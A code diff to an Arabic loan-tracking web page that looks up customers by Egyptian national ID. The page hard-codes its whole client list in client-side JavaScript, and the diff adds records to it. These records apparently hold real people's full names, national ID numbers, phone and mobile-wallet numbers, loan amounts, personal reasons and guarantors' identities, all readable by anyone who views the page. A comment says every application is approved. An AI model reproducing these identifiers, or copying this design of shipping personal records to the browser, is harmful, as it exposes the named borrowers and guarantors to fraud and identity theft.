@@ -232,7 +232,7 @@
             <input type="text" id="nationalId" placeholder="مثال: 29006040102911" maxlength="14" inputmode="numeric">
             <button class="btn-search" onclick="searchCustomer()"><i class="fas fa-search"></i> تتبع طلبي</button>
         </div>
-        <div class="loader" id="loader"><i class="fas fa-spinner fa-pulse fa-2x"></i> جاري جلب البيانات...</div>
+        <div class="loader" id="loader"><i class="fas fa-spinner fa-pulse fa-2x"></i> جاری جلب البيانات...</div>
     </div>
     <div class="result-card" id="resultCard"></div>
     <div class="error-card" id="errorCard"><i class="fas fa-exclamation-triangle"></i><p>⚠️ الرقم القومي غير مسجل في النظام. يرجى التأكد من صحة الرقم.</p></div>
@@ -264,9 +264,9 @@
 
 <script>
     // ***** قاعدة العملاء (جميع الطلبات موافقة) *****
-    // العملاء الأصليون + العملاء الجدد من نموذج استمارة.xlsx
+    // العملاء الأصليون + العملاء الجدد من نموذج استمارة.xlsx + العملاء الجدد المطلوب إضافتهم (أحمد فرج ويحي محمد)
     const clientsData = [
-        // العملاء الأصليون
+        // العملاء الأصليون (تم الحفاظ عليهم بالكامل)
         { id:"29006040102911", name:"مصطفى ربيع عبد الحميد", job:"عمل حر", loanRaw:"40,000", loanTerm:"18 شهر", installment:"2,965", total:"53,370", wallet:"فودافون كاش", walletNum:"01003165531", guarantorRelation:"عم", guarantorName:"محمود علي محمد", guarantorId:"28304241400951", guarantorPhone:"0111857964", reason:"التزامات ولزوم دفع مصروفات", otherLoans:"لايوجد", status:"approved" },
         { id:"29409010209751", name:"انس محمد حسين محمد", job:"موظف قطاع خاص", loanRaw:"200,000", loanTerm:"60 شهر", installment:"4,440", total:"266,400", wallet:"فودافون كاش", walletNum:"01009031820", guarantorRelation:"زوجة", guarantorName:"اسراء سالم الكيلاني سالم", guarantorId:"29909010206445", guarantorPhone:"01044288513", reason:"للسفر", otherLoans:"نعم", status:"approved" },
         { id:"27108062501071", name:"اسماعيل محمد خليل محمد", job:"موظف حكومي", loanRaw:"55,000", loanTerm:"24 شهر", installment:"3,075", total:"73,800", wallet:"اتصالات كاش", walletNum:"01115421242", guarantorRelation:"زوجة", guarantorName:"مشيرة ممدوح سيد هيكل", guarantorId:"28910142503044", guarantorPhone:"01153899445", reason:"علاج ابنى مريض لطيف التوحد", otherLoans:"نعم", status:"approved" },
@@ -316,9 +316,14 @@
         { id:"26908122300617", name:"حسن عبد المنجي عبدالعليم علي", job:"مدير إداري", loanRaw:"50,000", loanTerm:"24 شهر", installment:"2,725", total:"65,400", wallet:"اتصالات كاش", walletNum:"01155702546", guarantorRelation:"درجة أولى", guarantorName:"نهله عبد العزيز حسين عبد العزيز", guarantorId:"28201051402007", guarantorPhone:"+201023089996", reason:"تمويل شخصي", otherLoans:"لا", status:"approved" },
         { id:"29801190104216", name:"احمد محمد على حسانين", job:"رقيب شرطة", loanRaw:"50,000", loanTerm:"24 شهر", installment:"2,725", total:"65,400", wallet:"اتصالات كاش", walletNum:"01118043903", guarantorRelation:"درجة أولى", guarantorName:"منة الله وحيد حسن ابراهيم", guarantorId:"30001150100225", guarantorPhone:"+201550848420", reason:"تمويل شخصي", otherLoans:"نعم", status:"approved" },
         { id:"29504011508879", name:"محمود بدير شعبان علي موسي", job:"سائق", loanRaw:"200,000", loanTerm:"60 شهر", installment:"4,440", total:"266,400", wallet:"فودافون كاش", walletNum:"+20 10 10338675", guarantorRelation:"درجة أولى", guarantorName:"بدير شعبان علي موسي", guarantorId:"26601231500075", guarantorPhone:"+201002817443", reason:"تمويل شخصي", otherLoans:"لا", status:"approved" },
-        { id:"28805200409", name:"حنان دسوقي عبد المعز عبد الحفيظ", job:"صاحبة مشروع (أدوات منزلية)", loanRaw:"55,000", loanTerm:"24 شهر", installment:"3,075", total:"73,800", wallet:"اتصالات كاش", walletNum:"01555110957", guarantorRelation:"درجة أولى", guarantorName:"محمد سلامه مصطفى طه", guarantorId:"28309012300898", guarantorPhone:"+201124112118", reason:"تمويل شخصي", otherLoans:"لا", status:"approved" },
+        { id:"29804052402311", name:"ريمون عيد جرجس عيد", job:"مقاولات عامه", loanRaw:"100,000", loanTerm:"32 شهر", installment:"4,157", total:"133,024", wallet:"اتصالات كاش", walletNum:"01127331246", guarantorRelation:"زوجة", guarantorName:"كلارا هانى ملاك شكرى", guarantorId:"30508142404166", guarantorPhone:"+", reason:"تمويل شخصي", otherLoans:"لا", status:"approved" },
         { id:"2901009372", name:"محمد الخضرى الشهاوى الشهاوى", job:"عامل بمصنع سجاد", loanRaw:"40,000", loanTerm:"18 شهر", installment:"2,965", total:"53,370", wallet:"فودافون كاش", walletNum:"01095011484", guarantorRelation:"درجة أولى", guarantorName:"هبه الخضرى الشهاوى الشهاوى", guarantorId:"28501011216701", guarantorPhone:"+201065710711", reason:"تمويل شخصي", otherLoans:"لا", status:"approved" },
-        { id:"28002190100977", name:"محمد عبدالفتاح محمد حسن", job:"ربان سفن تجارية", loanRaw:"30,000", loanTerm:"12 شهر", installment:"3,325", total:"39,900", wallet:"فودافون كاش", walletNum:"01551351884", guarantorRelation:"درجة ثانية", guarantorName:"ابراهيم محمد عبدالفتاح محمد حسن", guarantorId:"30701090105967", guarantorPhone:"+201222955831", reason:"تمويل شخصي", otherLoans:"لا", status:"approved" }
+        { id:"28002190100977", name:"محمد عبدالفتاح محمد حسن", job:"ربان سفن تجارية", loanRaw:"30,000", loanTerm:"12 شهر", installment:"3,325", total:"39,900", wallet:"فودافون كاش", walletNum:"01551351884", guarantorRelation:"درجة ثانية", guarantorName:"ابراهيم محمد عبدالفتاح محمد حسن", guarantorId:"30701090105967", guarantorPhone:"+201222955831", reason:"تمويل شخصي", otherLoans:"لا", status:"approved" },
+
+        // ========== العملاء الجدد المطلوب إضافتهم ==========
+        { id:"28205052400992", name:"أحمد فرج محمود أبو العلا", job:"فنى صيانة أجهزة كهربائية (تكييف ومراوح وثلاجات)", loanRaw:"150,000", loanTerm:"48 شهر", installment:"4,205", total:"201,840", wallet:"فودافون كاش", walletNum:"01069883812", guarantorRelation:"أخ", guarantorName:"محمد فرج محمود أبو العلا", guarantorId:"", guarantorPhone:"01111560113", reason:"تطوير محل الصيانة وشراء قطع غيار وأجهزة", otherLoans:"لا", status:"approved" },
+        // العميل: يحي محمد نور الدين أحمد
+        { id:"28708092701733", name:"يحي محمد نورالدين احمد", job:"عمل حر", loanRaw:"60,000", loanTerm:"24 شهر", installment:"3,085", total:"74,040", wallet:"فودافون كاش", walletNum:"01012725330", guarantorRelation:"زوجة", guarantorName:"شريفة احمد محمد قاسم", guarantorId:"29708262701001", guarantorPhone:"01145208119", reason:"تمويل شخصي", otherLoans:"لا", status:"approved" }
     ];
 
     let currentClient = null;
@@ -351,7 +356,7 @@
                 <div class="info-card">
                     <h3><i class="fas fa-user-circle"></i> بيانات العميل</h3>
                     <table class="info-table">
-                        <tr><td>الاسم</td><td>${client.name}</td></tr>
+                        <tr><td style="width:40%">الاسم</td><td>${client.name}</td></tr>
                         <tr><td>الرقم القومي</td><td>${client.id}</td></tr>
                         <tr><td>الوظيفة</td><td>${client.job}</td></tr>
                         <tr><td>المحفظة</td><td>${client.wallet}</td></tr>
@@ -364,7 +369,7 @@
                     <table class="info-table">
                         <tr><td>القرابة</td><td>${client.guarantorRelation}</td></tr>
                         <tr><td>الاسم</td><td>${client.guarantorName}</td></tr>
-                        <tr><td>الرقم القومي</td><td>${client.guarantorId}</td></tr>
+                        <tr><td>الرقم القومي</td><td>${client.guarantorId || "غير مسجل"}</td></tr>
                         <tr><td>الهاتف</td><td>${client.guarantorPhone || "غير مسجل"}</td></tr>
                     </table>
                 </div>
